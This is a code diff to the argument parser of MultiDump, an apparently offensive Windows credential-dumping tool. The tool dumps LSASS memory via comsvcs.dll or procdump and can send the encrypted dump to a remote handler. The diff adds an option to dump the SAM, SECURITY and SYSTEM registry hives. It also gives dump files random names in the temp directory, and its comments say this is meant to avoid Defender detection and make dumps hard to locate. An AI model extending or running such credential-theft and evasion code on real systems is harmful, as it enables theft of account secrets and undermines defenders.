@@ -13,13 +13,16 @@ ParsedArgs ParseArgs(int argc, char* argv[]) {
 	CHAR tempDumpPath[MAX_PATH];
 
 	for (int i = 0; i < argc; i++) {
-		if ((strcmp(argv[i], "-H") == 0 || strcmp(argv[i], "-h") == 0)) {
+		if ((strcmp(argv[i], "-H") == 0 || strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)) {
 #ifdef DEBUG
 			printf("\nUsage:\tMultiDump.exe [-p <ProcDumpPath>] [-l <LocalDumpPath> | -r <RemoteHandlerAddr>] [--procdump] [-v]\n\n");
-			printf("-p\t\tPath to save procdump.exe, use full path. Default to current directory\n");
+			printf("-p\t\tPath to save procdump.exe, use full path. Default to temp directory\n");
 			printf("-l\t\tPath to save encrypted dump file, use full path. Default to current directory\n");
 			printf("-r\t\tSet ip:port to connect to a remote handler\n");
 			printf("--procdump\tWrites procdump to disk and use it to dump LSASS\n");
+			printf("--nodump\tDisable LSASS dumping\n");
+			printf("--reg\t\tDump SAM, SECURITY and SYSTEM hives\n");
+			printf("--delay\t\tIncrease interval between connections to for slower network speeds\n");
 			printf("-v\t\tEnable verbose mode\n");
 			printf("\nMultiDump defaults in local mode using comsvcs.dll and saves the encrypted dump in the current directory.\n");
 			printf("Examples:\n");
@@ -46,6 +49,15 @@ ParsedArgs ParseArgs(int argc, char* argv[]) {
 		else if ((strcmp(argv[i], "--procdump") == 0)) {
 			args.procDumpMode = TRUE;
 		}
+		else if ((strcmp(argv[i], "--nodump") == 0)) {
+			args.noDump = TRUE;
+		}
+		else if ((strcmp(argv[i], "--reg") == 0)) {
+			args.regDump = TRUE;
+		}
+		else if ((strcmp(argv[i], "--delay") == 0)) {
+			args.connectionDelay = TRUE;
+		}
 	}
 
 	if (_getcwd(currentDir, MAX_PATH) == NULL) {
@@ -62,16 +74,17 @@ ParsedArgs ParseArgs(int argc, char* argv[]) {
 		exit(-1);
 	}
 
-	// If ProcDump -o uses a relative path, it gets caught by defende somehow
-	// Hardcoding this to make sure it works
+	// if the dump extension is not .dmp, it will be appened to the end of the filename
+	// using relative path also makes it more diffcult to locate it, 
+	// so hardcoding this to make sure it works
 	char dmpName[7];
-	GenerateFileName(dmpName, 6);
+	GenerateFileNameA(dmpName, 6);
 	snprintf(tempDumpPath, sizeof(tempDumpPath), "%s%s.dmp", tempDir, dmpName);
 	args.tempDmpPath = strdup(tempDumpPath);
 
 	if (args.procDumpPath == NULL) {
 		char procDumpName[7];
-		GenerateFileName(procDumpName, 6);
+		GenerateFileNameA(procDumpName, 6);
 		snprintf(procDumpPath, sizeof(procDumpPath), "%s%s.exe", tempDir, procDumpName);
 		args.procDumpPath = strdup(procDumpPath);
 	}
@@ -81,7 +94,7 @@ ParsedArgs ParseArgs(int argc, char* argv[]) {
 	// Setting the default in case remote mode fails
 	if (args.localDmpPath == NULL) {
 		char encDmpName[7];
-		GenerateFileName(encDmpName, 6);
+		GenerateFileNameA(encDmpName, 6);
 		snprintf(dmpDir, sizeof(dmpDir), "%s\\%s.dat", currentDir, encDmpName);
 		args.localDmpPath = strdup(dmpDir);
 	}
